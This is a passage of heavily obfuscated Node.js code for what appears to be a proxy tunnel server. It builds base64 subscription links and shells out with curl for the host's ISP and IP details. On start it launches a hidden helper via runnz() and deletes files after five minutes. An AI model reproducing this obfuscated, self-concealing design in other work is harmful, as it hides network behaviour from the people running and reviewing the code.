_0x8eec9a=_0x2526eb;_0x37bb11?(log(_0x8eec9a(0x17d),_0x8eec9a(0x168)+_0x37bb11[_0x8eec9a(0xb8)]),_0x150e50(_0x37bb11)):_0x11a4db();});});}[_0x20a18d(0x14c)](){const _0x44ffee=_0x20a18d;if(!this[_0x44ffee(0xee)]||!this[_0x44ffee(0x128)])return;try{!this[_0x44ffee(0x152)]&&(this[_0x44ffee(0xee)][_0x44ffee(0xcb)](this[_0x44ffee(0x128)]),this['headerSent']=!![]),this[_0x44ffee(0x182)][_0x44ffee(0xb4)](this[_0x44ffee(0xee)]),this[_0x44ffee(0x182)]['on'](_0x44ffee(0x11a),()=>{const _0x5d7378=_0x44ffee;!this[_0x5d7378(0xee)][_0x5d7378(0x148)]&&this['currentStreamRes'][_0x5d7378(0x11a)]();}),this['remote']['on'](_0x44ffee(0x17d),_0x5d392e=>{const _0x1b22cf=_0x44ffee;log(_0x1b22cf(0x17d),_0x1b22cf(0x166)+_0x5d392e[_0x1b22cf(0xb8)]),!this[_0x1b22cf(0xee)][_0x1b22cf(0x148)]&&this[_0x1b22cf(0xee)][_0x1b22cf(0x11a)]();});}catch(_0x516af9){log(_0x44ffee(0x17d),_0x44ffee(0xae)+_0x516af9[_0x44ffee(0xb8)]),this['cleanup']();}}['cleanup'](){const _0x757dd9=_0x20a18d;!this[_0x757dd9(0x170)]&&(this[_0x757dd9(0x170)]=!![],log(_0x757dd9(0xe7),_0x757dd9(0x158)+this[_0x757dd9(0x14b)]),this[_0x757dd9(0x182)]&&(this[_0x757dd9(0x182)][_0x757dd9(0x14d)](),this['remote']=null),this[_0x757dd9(0x111)]=![],this['headerSent']=![]);}}const metaInfo=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x20a18d(0x12b)}),ISP=metaInfo[_0x20a18d(0x16c)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb',{'encoding':_0x20a18d(0x12b)})[_0x20a18d(0x16c)]();}catch(_0x142df1){try{IP='['+execSync(_0x20a18d(0x102),{'encoding':_0x20a18d(0x12b)})[_0x20a18d(0x16c)]()+']';}catch(_0x56f2a7){log(_0x20a18d(0x17d),_0x20a18d(0xb6),_0x56f2a7['message']),IP='localhost';}}const server=http[_0x20a18d(0xff)]((_0x445c37,_0x9c79a5)=>{const _0x5b2353=_0x20a18d,_0x1f47f5={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,\x20POST','Cache-Control':_0x5b2353(0x131),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x445c37[_0x5b2353(0xe2)]==='/'){_0x9c79a5['writeHead'](0xc8,{'Content-Type':_0x5b2353(0xdf)}),_0x9c79a5[_0x5b2353(0x11a)](_0x5b2353(0x113));return;}if(_0x445c37['url']==='/'+SUB_PATH){const _0x39ebb4=_0x5b2353(0x185)+UUID+'@'+IP+_0x5b2353(0xb2)+IP+'&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+_0x5b2353(0x169)+SETTINGS[_0x5b2353(0x11d)]+_0x5b2353(0x127)+NAME+'-'+ISP,_0x9bf1d0=Buffer[_0x5b2353(0xde)](_0x39ebb4)[_0x5b2353(0xba)](_0x5b2353(0xbf));_0x9c79a5[_0x5b2353(0xcd)](0xc8,{'Content-Type':_0x5b2353(0xdf)}),_0x9c79a5[_0x5b2353(0x11a)](_0x9bf1d0+'\x0a');return;}const _0x16cf22=_0x445c37['url'][_0x5b2353(0xc5)](new RegExp(XPATH+'/([^/]+)(?:/([0-9]+))?$'));if(!_0x16cf22){_0x9c79a5[_0x5b2353(0xcd)](0x194),_0x9c79a5['end']();return;}const _0x5e2aac=_0x16cf22[0x1],_0x163ce=_0x16cf22[0x2]?parseInt(_0x16cf22[0x2]):null;if(_0x445c37[_0x5b2353(0xbc)]==='GET'&&!_0x163ce){_0x1f47f5[_0x5b2353(0xd3)]=_0x5b2353(0xa4),_0x1f47f5['Transfer-Encoding']=_0x5b2353(0x13c);let _0x3dee36=sessions[_0x5b2353(0x17b)](_0x5e2aac);!_0x3dee36&&(_0x3dee36=new Session(_0x5e2aac),sessions[_0x5b2353(0x100)](_0x5e2aac,_0x3dee36),log(_0x5b2353(0xd5),'Created\x20new\x20session\x20for\x20GET:\x20'+_0x5e2aac));_0x3dee36[_0x5b2353(0x125)]=!![];!_0x3dee36[_0x5b2353(0xaa)](_0x9c79a5,_0x1f47f5)&&(log(_0x5b2353(0x17d),_0x5b2353(0x181)+_0x5e2aac),!_0x9c79a5[_0x5b2353(0xe3)]&&(_0x9c79a5[_0x5b2353(0xcd)](0x1f4),_0x9c79a5[_0x5b2353(0x11a)]()),_0x3dee36['cleanup'](),sessions['delete'](_0x5e2aac));return;}if(_0x445c37[_0x5b2353(0xbc)]===_0x5b2353(0xaf)&&_0x163ce!==null){let _0x43b414=sessions[_0x5b2353(0x17b)](_0x5e2aac);!_0x43b414&&(_0x43b414=new Session(_0x5e2aac),sessions[_0x5b2353(0x100)](_0x5e2aac,_0x43b414),log(_0x5b2353(0xd5),_0x5b2353(0xb5)+_0x5e2aac),setTimeout(()=>{const _0x2bb399=_0x5b2353,_0x1b04cf=sessions[_0x2bb399(0x17b)](_0x5e2aac);_0x1b04cf&&!_0x1b04cf[_0x2bb399(0x125)]&&(log(_0x2bb399(0xa2),_0x2bb399(0x122)+_0x5e2aac+_0x2bb399(0xfe)),_0x1b04cf[_0x2bb399(0xdc)](),sessions[_0x2bb399(0x138)](_0x5e2aac));},SETTINGS[_0x5b2353(0xb0)]));let _0x18e5e2=[],_0x24d8d7=0x0,_0x2d5073=![];_0x445c37['on']('data',_0x15651c=>{const _0x4c8125=_0x5b2353;_0x24d8d7+=_0x15651c[_0x4c8125(0x15d)];if(_0x24d8d7>SETTINGS[_0x4c8125(0x124)]){!_0x2d5073&&(_0x9c79a5[_0x4c8125(0xcd)](0x19d),_0x9c79a5[_0x4c8125(0x11a)](),_0x2d5073=!![]);return;}_0x18e5e2['push'](_0x15651c);}),_0x445c37['on'](_0x5b2353(0x11a),async()=>{const _0x49618f=_0x5b2353;if(_0x2d5073)return;try{const _0x11abf6=Buffer['concat'](_0x18e5e2);log('info',_0x49618f(0xef)+_0x163ce+_0x49618f(0xf2)+_0x11abf6[_0x49618f(0x15d)]),await _0x43b414[_0x49618f(0x144)](_0x163ce,_0x11abf6),!_0x2d5073&&(_0x9c79a5[_0x49618f(0xcd)](0xc8,_0x1f47f5),_0x2d5073=!![]),_0x9c79a5[_0x49618f(0x11a)]();}catch(_0x25defb){log('error',_0x49618f(0xab)+_0x25defb[_0x49618f(0xb8)]),_0x43b414[_0x49618f(0xdc)](),sessions[_0x49618f(0x138)](_0x5e2aac),!_0x2d5073&&(_0x9c79a5[_0x49618f(0xcd)](0x1f4),_0x2d5073=!![]),_0x9c79a5[_0x49618f(0x11a)]();}});return;}_0x9c79a5[_0x5b2353(0xcd)](0x194),_0x9c79a5[_0x5b2353(0x11a)]();});server['on']('secureConnection',_0x11836f=>{const _0x212a29=_0x20a18d;log(_0x212a29(0xe7),_0x212a29(0x12a)+(_0x11836f[_0x212a29(0x10c)]||_0x212a29(0x143)));});function generatePadding(_0xb3c0b8,_0x1757e4){const _0x5d92a1=_0x20a18d,_0x35dd28=_0xb3c0b8+Math[_0x5d92a1(0xc9)](Math[_0x5d92a1(0xf6)]()*(_0x1757e4-_0xb3c0b8));return Buffer[_0x5d92a1(0xde)](Array(_0x35dd28)[_0x5d92a1(0x151)]('X')[_0x5d92a1(0xbb)](''))['toString']('base64');}server[_0x20a18d(0xb9)]=0x975e0,server[_0x20a18d(0x106)]=0x98968,server['on'](_0x20a18d(0x17d),_0x13434a=>{const _0x3212f6=_0x20a18d;log('error',_0x3212f6(0x155)+_0x13434a[_0x3212f6(0xb8)]);});const delFiles=()=>{const _0x4183ae=_0x20a18d;[_0x4183ae(0xca),_0x4183ae(0x9f)][_0x4183ae(0x159)](_0x571643=>fs[_0x4183ae(0xe6)](_0x571643,()=>{}));};server[_0x20a18d(0x16f)](PORT,()=>{const _0x26e8ce=_0x20a18d;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x26e8ce(0xc4)](_0x26e8ce(0x110)+PORT),log('info',_0x26e8ce(0x149)),log(_0x26e8ce(0xd5),_0x26e8ce(0x134)+SETTINGS['LOG_LEVEL']),log(_0x26e8ce(0xd5),_0x26e8ce(0x161)+SETTINGS[_0x26e8ce(0x175)]),log('info',_0x26e8ce(0x10e)+SETTINGS[_0x26e8ce(0x124)]+'KB'),log(_0x26e8ce(0xd5),_0x26e8ce(0x172)+SETTINGS[_0x26e8ce(0xa7)]+'KB'),log(_0x26e8ce(0xd5),_0x26e8ce(0x123)+SETTINGS[_0x26e8ce(0x10f)]+_0x26e8ce(0x177)),log(_0x26e8ce(0xd5),_0x26e8ce(0x149));});
